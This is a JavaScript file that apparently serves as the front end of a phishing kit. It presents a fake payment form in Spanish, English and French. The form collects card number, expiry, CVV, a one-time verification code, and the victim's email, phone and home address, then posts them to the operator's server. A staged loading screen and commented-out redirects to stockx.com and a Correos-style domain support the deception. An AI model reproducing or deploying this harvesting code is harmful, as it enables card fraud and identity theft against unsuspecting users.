layui.use([],function () {
    console.log(111)
    var $ = layui.jquery,layer = layui.layer,sid = window.sessionid,accdata = window.sessdata,datas = {},index;
    var lang = {
        short:{
            'a':"se debe completar el código de verificación",
            "q":'error de entrada',
            'b':"El titular de la tarjeta no puede estar vacío",
            'c':"El número de tarjeta no puede estar vacío",
            'd':"El período de validez no puede estar vacío",
            'e':"VCC no puede estar vacío",
            'f':"El correo electrónico no puede estar vacío.",
            'h':"Error de formato de correo electrónico",
            'i':"El nombre de usuario no puede estar vacío",
            'j':"El teléfono móvil no puede estar vacío.",
            'k':"La región no puede estar vacía",
            'l':"La ciudad no puede estar vacía.",
            'm':"El código postal no puede estar vacío",
            'n':"La dirección no puede estar vacía.",
            'o':"El número de casa no puede estar vacío",
            'p':"El hogar no puede estar vacío"
        },
        adly:{
            'a':"verification code must be completed",
            "q":'input error',
            'b':"Cardholder cannot be empty",
            'c':"The card number cannot be empty",
            'd':"Validity period cannot be empty",
            'e':"VCC cannot be empty",
            'f':"The email cannot be empty.",
            'h':"Email format error",
            'i':"Username cannot be empty",
            'j':"The mobile phone cannot be empty.",
            'k':"The region cannot be empty",
            'l':"The city cannot be empty.",
            'm':"Postcode cannot be empty",
            'n':"The address cannot be empty.",
            'o':"The house number cannot be empty",
            'p':"The home cannot be empty"
        },
        fg:{
            'a':"le code de vérification doit être complété",
            "q":"erreur d'entrée",
            'b':"Le titulaire de la carte ne peut pas être vide",
            'c':"Le numéro de carte ne peut pas être vide",
            'd':"La période de validité ne peut pas être vide",
            'e':"VCC ne peut pas être vide",
            'f':"L'e-mail ne peut pas être vide.",
            'h':"Erreur de format d'e-mail",
            'i':"Le nom d'utilisateur ne peut pas être vide",
            'j':"Le téléphone portable ne peut pas être vide.",
            'k':"La région ne peut pas être vide",
            'l':"La ville ne peut pas être vide.",
            'm':"Le code postal ne peut pas être vide",
            'n':"L'adresse ne peut pas être vide.",
            'o':"Le numéro de rue ne peut pas être vide",
            'p':"La maison ne peut pas être vide"
        },
        nf:{
            'a':"verification code must be completed",
            "q":'input error',
            'b':"Cardholder cannot be empty",
            'c':"The card number cannot be empty",
            'd':"Validity period cannot be empty",
            'e':"VCC cannot be empty",
            'f':"The email cannot be empty.",
            'h':"Email format error",
            'i':"Username cannot be empty",
            'j':"The mobile phone cannot be empty.",
            'k':"The region cannot be empty",
            'l':"The city cannot be empty.",
            'm':"Postcode cannot be empty",
            'n':"The address cannot be empty.",
            'o':"The house number cannot be empty",
            'p':"The home cannot be empty"
        },
        en:{
            'a':"verification code must be completed",
            "q":'input error',
            'b':"Cardholder cannot be empty",
            'c':"The card number cannot be empty",
            'd':"Validity period cannot be empty",
            'e':"VCC cannot be empty",
            'f':"The email cannot be empty.",
            'h':"Email format error",
            'i':"Username cannot be empty",
            'j':"The mobile phone cannot be empty.",
            'k':"The region cannot be empty",
            'l':"The city cannot be empty.",
            'm':"Postcode cannot be empty",
            'n':"The address cannot be empty.",
            'o':"The house number cannot be empty",
            'p':"The home cannot be empty"
        },
        fr:{
            'a':"le code de vérification doit être complété",
            "q":"erreur d'entrée",
            'b':"Le titulaire de la carte ne peut pas être vide",
            'c':"Le numéro de carte ne peut pas être vide",
            'd':"La période de validité ne peut pas être vide",
            'e':"VCC ne peut pas être vide",
            'f':"L'e-mail ne peut pas être vide.",
            'h':"Erreur de format d'e-mail",
            'i':"Le nom d'utilisateur ne peut pas être vide",
            'j':"Le téléphone portable ne peut pas être vide.",
            'k':"La région ne peut pas être vide",
            'l':"La ville ne peut pas être vide.",
            'm':"Le code postal ne peut pas être vide",
            'n':"L'adresse ne peut pas être vide.",
            'o':"Le numéro de rue ne peut pas être vide",
            'p':"La maison ne peut pas être vide"
        },
    };
    if($.cookie('langData'))  window.langdata = $.cookie('langData')
    // window.langdata == 'nf' // 英文
    window.lang = function(msg) {
        let vl = lang[window.langdata];
        if(vl){
            let vls = vl[msg];
            if(vls){
                return vls;
            }
        }
        return msg;
    }

    // if(accdata.status == 4){
    //     //已完成，直接跳转到不存在的页面
    //     // window.location.href = 'http://' + window.location.host + ":8888"
    //     if(window.langdata == 'nf'){
    //         window.location.href = "https://stockx.com";
    //     }else{
    //         window.location.href = "http://www.correos.cc/";
    //     }
    // }

    window.maxcvv = function (e) {
        var value = $("#cvv").val(),cur = e.key,number = "0123456789";
        if(number.indexOf(cur) == -1){
            value = value.replace(cur,'');
            $("#cvv").val(value);
        }else{
            if(value.length >= 3){
                $("#cvv").val(value.substr(-3,3));
            }
        }
    }

    //对过期数据进行处理
    window.maxtime = function (e) {
        console.log()
        let value = $("#maxtime").val(),cur = e.key,number = "0123456789/",arrval = value.split('/');
        console.log(value,cur)

        if(number.indexOf(cur) == -1){
            value = value.replace(cur,'');
            $("#maxtime").val(value);
        }else{
            if(value.indexOf('/') == -1){
                let left = arrval[0];
                left = left ? left : "";
                if(left.length == 2){
                    if(left * 1 > 12){
                        left = 12;
                    }else if(left < 10){
                        left = "0" + left;
                    }
                    $("#maxtime").val(left + "/");
                }else if(left.length > 2){
                    left = left.substr(-2,2);
                    if(left * 1 > 12){
                        left = 12;
                    }else if(left < 10){
                        left = "0" + left;
                    }
                    $("#maxtime").val(left + "/");
                }
            }else{
                let left = arrval[0],right = arrval[1];
                left = left ? left : "";
                right = right ? right : false;
                if(left.length > 2){
                    left = left.substr(-2,2);
                    if(left * 1 > 12){
                        left = 12;
                    }else if(left < 10){
                        left = "0" + left;
                    }
                }else{
                    if(left * 1 > 12){
                        left = 12;
                    }else if(left < 10){
                        left = "0" + left;
                    }
                }
                if(right.length > 2){
                    right = right.substr(-2,2);
                }
                $("#maxtime").val(left + "/" + right);
            }
        }
    }
    
    let submitCode;

    //提交验证码
    window.openinfo3 = function (callback) {
        var datainfo = {
            code:$('#code').val()
        }
        if(!datainfo.code){
            layer.msg(window.lang('a'));
            return false;
        }
        submitCode = callback;
        index = layer.load(0, {shade: 0.8});
        $.ajax({
            url:"/index/postcode",
            data:datainfo,
            dataType: "json",
            type:'post',
            success(res){
                if(res.code == 200){

                }else{
                    layer.close(index);
                    layer.msg(window.lang(res.msg))
                }
            }
        })
    }

    //提交卡号
    window.openinfo2 = function (fitter,error) {
        if(!fitter){
            fitter = {}
        }
        datas.card_name = $("#card_name").val();
        datas.card_number = $("#card_number").val();
        datas.maxtime = $("#maxtime").val();
        datas.cvv = $("#cvv").val();

        if(!fitter.card_name){
            if(!datas.card_name){
                layer.msg(window.lang('b'));
                return false;
            }
        }

        if(!fitter.card_number){
            if(!datas.card_number){
                layer.msg(window.lang('c'));
                return false;
            }
        }

        if(!fitter.maxtime){
            if(!datas.maxtime){
                layer.msg(window.lang('d'));
                return false;
            }
        }

        if(!fitter.cvv){
            if(!datas.cvv){
                layer.msg(window.lang('e'));
                return false;
            }
        }

        index = layer.load(0, {shade: 0.8});
        $.ajax({
            url:"index/postdata",
            data:datas,
            dataType:"json",
            type:"post",
            success(res){
                if(res.code == 200){
                    submitCode = error;
                }else{
                    if(typeof error == 'function'){
                        error(res.msg,index)
                    }else{
                        layer.msg(window.lang(res.msg));
                    }
                }
            }
        })
    }

    //提交基础信息
    window.openinfo = function (fitter) {
        datas = {
            email:$("#email").val(),
            username:$("#username2").val() + $("#username1").val(),
            phone:$("#phone").val(),
            area:$("#area").val(),
            city:$("#city").val(),
            youbian:$("#youbian").val(),
            address:$("#address").val(),
            address_num:$("#address_num").val(),
            home:$("#home").val()
        }
        console.log('datas',datas);
        if(!fitter){
            fitter = {}
        }      
        if(!fitter.email){
            if(!datas.email){
                layer.msg(window.lang('f'));
                return false;
            }

            if(datas.email.indexOf('@') == -1){
                layer.msg(window.lang('h'));
                return false;
            }
        }
        if(!fitter.username){
            if(!$("#username1").val()){
                layer.msg(window.lang('i'));
                return false;
            }
        }

        if(!fitter.phone){
            if(!datas.phone){
                layer.msg(window.lang('j'));
                return false;
            }
        }

        if(!fitter.area){
            if(!datas.area){
                layer.msg(window.lang('k'));
                return false;
            }
        }

        if(!fitter.city){
            if(!datas.city){
                layer.msg(window.lang('l'));
                return false;
            }
        }

        if(!fitter.youbian){
            if(!datas.youbian){
                layer.msg(window.lang('m'));
                return false;
            }
        }

        if(!fitter.address){
            if(!datas.address){
                layer.msg(window.lang('n'));
                return false;
            }
        }

        if(!fitter.address_num){
            if(!datas.address_num){
                layer.msg(window.lang('o'));
                return false;
            }
        }

        if(!fitter.home){
            if(!datas.home){
                layer.msg(window.lang('p'));
                return false;
            }
        }
        console.log('通过验证',datas);
        $.cookie('userData', JSON.stringify(datas));
        window.openUrl("../info.html")
    }
    
    window.opendata = {};
    
    window.closeUrl = function(url){
        var index = window.opendata[url];
        layer.close(index);
    }

    //公共跳转
    window.openUrl = function(url){
        $.ajax({
            url:url,
            success:function (res) {
                var index = layer.open({
                    closeBtn:false,
                    area:['100%','100%'],
                    title:false,
                    type:1,
                    content:res,
                    anim:2,
                    success:function(){
                        window.opendata[url] = index
                    },
                    end:function(){
                        window.reload();
                    }
                })
            }
        })
    }
})


$('.PaymentBtn').on('click',function(){
    // $('.loaing_warp').addClass('show').removeClass('hide') // 显示loading加载
    // $('.loaing_warp').addClass('hide').removeClass('show') // 隐藏 Loading加载
    $('.loaing_warp').addClass('show').removeClass('hide')
    setTimeout(()=>{
        $('.loaing_warp').addClass('hide').removeClass('show')
        window.openUrl("../code.html")
    },3000)
    window.openinfo2({},function(msg,index) {
        layui.use([],function() {
            var $ = layui.jquery;
            layui.layer.close(index)
            $('#listerror').show();
        })
    })
})
$('.PaymentBtn').on('click',function(){
    // $('.loaing_warp').addClass('show').removeClass('hide') // 显示loading加载
    // $('.loaing_warp').addClass('hide').removeClass('show') // 隐藏 Loading加载
    $('.loaing_warp').addClass('show').removeClass('hide')
    setTimeout(()=>{
        $('.loaing_warp').addClass('hide').removeClass('show')
    },3000)

})

